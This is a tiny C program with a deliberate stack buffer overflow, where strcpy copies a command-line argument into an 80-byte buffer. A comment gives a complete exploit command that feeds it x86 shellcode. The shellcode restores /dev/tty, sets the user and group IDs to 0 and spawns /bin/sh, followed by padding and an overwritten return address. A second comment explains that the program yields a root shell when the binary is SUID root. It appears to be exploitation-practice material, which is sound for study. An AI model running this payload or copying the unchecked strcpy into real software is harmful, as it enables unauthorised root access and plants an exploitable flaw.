#include <string.h>

void function(char* str)
{
  char buffer[80];
  strcpy(buffer, str);
}

int main(int argc, char** argv)
{
   function(argv[1]);
}

// run $( python2 -c 'print("\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"A"*21+"\x19\x90\x04\x08" )')
// for root elevatation, owner must be root & SUID bit must be set!
